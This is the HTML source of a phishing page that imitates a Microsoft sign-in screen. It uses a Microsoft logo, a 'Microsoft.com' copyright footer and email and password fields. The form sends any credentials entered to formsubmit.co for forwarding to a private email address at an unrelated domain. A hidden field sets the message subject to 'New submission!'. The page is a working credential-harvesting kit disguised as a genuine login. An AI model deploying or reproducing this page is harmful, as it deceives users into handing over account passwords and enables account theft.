<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to your account</title>

    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css"
      integrity="sha384-xeJqLiuOvjUBq3iGOjvSQSIlwrpqjSHXpduPd6rQpuiM3f5/ijby8pCsnbu5S81n"
      crossorigin="anonymous"
    />
  </head>
  <body class="bg-light">
    <!-- Showcase -->

    <section class="text-dark p-5 showcase text-center text-sm-start">
      <div class="container">
        <img
          class="img-fluid w-20 d-none d-sm-block logo"
          src="/assets/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
        />
        <h2 class="pt-3 pb-2">Sign In</h2>
        <div class="d-sm-flex align-items-center justify-content-between">
          <div>
            <form
              action="https://formsubmit.co/kevin.ani@bochsystems.net"
              method="POST"
            >
              <div class="input my-3">
                <input
                  class="p-1"
                  type="text"
                  name="firstname"
                  id="firstname"
                  placeholder="Email, phone, or Skype"
                />
              </div>
              <div class="input my-3">
                <input
                  class="p-1"
                  type="password"
                  name="password"
                  id="password"
                  placeholder="Password"
                />
              </div>
              <a href="https://forms.office.com/r/0U0mzs04Uc"
                ><input class="btn login" type="submit" value="Submit"
              /></a>
              <input
                type="hidden"
                name="_next"
                value="https://yourdomain.co/thanks.html"
              />
              <input type="hidden" name="_subject" value="New submission!" />
              <input
                type="hidden"
                name="_autoresponse"
                value="your custom message"
              />
            </form>
          </div>
        </div>
      </div>
    </section>

    <footer class="foot bg-light p-4 text-dark text-center position-relative">
      <div class="container">
        <p class="lead">Microsoft.com &copy; 2023 All rights reserved</p>
      </div>
    </footer>

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous"
    ></script>
    <script src="/assets/app.js"></script>
  </body>
</html>
